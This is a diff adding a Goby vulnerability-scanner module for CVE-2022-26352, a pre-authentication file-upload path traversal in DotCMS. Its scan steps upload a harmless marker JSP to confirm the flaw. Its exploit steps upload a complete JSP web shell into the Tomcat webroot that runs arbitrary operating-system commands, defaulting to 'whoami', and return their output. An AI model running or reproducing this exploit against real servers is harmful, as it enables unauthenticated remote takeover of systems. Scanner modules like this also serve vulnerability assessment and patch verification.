@@ -1,0 +1,156 @@
+{
+      "Name": "DotCMS Arbitrary File Upload CVE-2022-26352",
+      "Level": "3",
+      "Tags": [
+            "fileupload"
+      ],
+      "GobyQuery": "body=\"DotCMS\"",
+      "Description": "dotCMS is an open source Hybrid CMS - built on leading Java technology. Considered to be a next-generation platform that supports both the flexibility of a headless CMS, with the efficiency of traditional content authoring.",
+      "Product": "DotCMS",
+      "Homepage": "https://www.dotcms.com/",
+      "Author": "",
+      "Impact": "A pre-auth remote code execution vulnerability was found in DotCMS which was achievable by performing a directory traversal attack during file upload. This vulnerability ultimately allows attacker to execute arbitrary commands on the underlying system.",
+      "Recommendation": "https://www.dotcms.com/security/SI-62",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2022-26352",
+            "https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "filename",
+                  "Type": "input",
+                  "Value": "shell.jsp"
+            },
+            {
+                  "Name": "cmd",
+                  "Type": "input",
+                  "Value": "whoami"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/api/content/",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=------------------------aadc326f7ae3eac3"
+                        },
+                        "data_type": "text",
+                        "data": "--------------------------aadc326f7ae3eac3\r\nContent-Disposition: form-data; name=\"name\"; filename=\"../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/vuln.jsp\"\r\nContent-Type: text/plain\r\n\r\n<%\r\nout.println(\"CVE-2022-26352\");\r\n%>\r\n--------------------------aadc326f7ae3eac3--",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/vuln.jsp",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "CVE-2022-26352",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/api/content/",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=------------------------aadc326f7ae3eac3"
+                        },
+                        "data_type": "text",
+                        "data": "--------------------------aadc326f7ae3eac3\r\nContent-Disposition: form-data; name=\"name\"; filename=\"../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/{{{filename}}}\"\r\nContent-Type: text/plain\r\n\r\n<%@ page import=\"java.util.*,java.io.*\"%>\r\n<%\r\n%>\r\n<HTML><BODY>\r\nCommands with JSP\r\n<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\r\n<INPUT TYPE=\"text\" NAME=\"cmd\">\r\n<INPUT TYPE=\"submit\" VALUE=\"Send\">\r\n</FORM>\r\n<pre>\r\n<%\r\nif (request.getParameter(\"cmd\") != null) {\r\n    out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\r\n    Process p;\r\n    if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\r\n        p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\"));\r\n    }\r\n    else{\r\n        p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\r\n    }\r\n    OutputStream os = p.getOutputStream();\r\n    InputStream in = p.getInputStream();\r\n    DataInputStream dis = new DataInputStream(in);\r\n    String disr = dis.readLine();\r\n    while ( disr != null ) {\r\n    out.println(disr);\r\n    disr = dis.readLine();\r\n    }\r\n}\r\n%>\r\n</pre>\r\n</BODY></HTML>\r\n--------------------------aadc326f7ae3eac3--",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/{{{filename}}}?cmd={{{cmd}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
